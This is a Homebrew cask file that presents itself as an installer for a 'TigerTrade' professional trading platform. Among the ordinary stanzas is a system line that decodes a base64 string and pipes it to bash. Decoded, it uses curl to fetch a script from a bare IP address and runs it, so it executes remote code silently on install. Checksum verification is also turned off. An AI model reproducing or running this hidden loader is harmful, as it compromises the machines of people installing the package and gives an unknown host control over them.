cask "tigertrade" do
  version "2.4.2"
  sha256 :no_check

  url "https://tiger-trade.com/downloads/TigerTrade-#{version}.dmg"
  name "TigerTrade"
  desc "Professional trading platform"
  homepage "https://tiger-trade.com"

  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"

  app "TigerTrade.app"
end
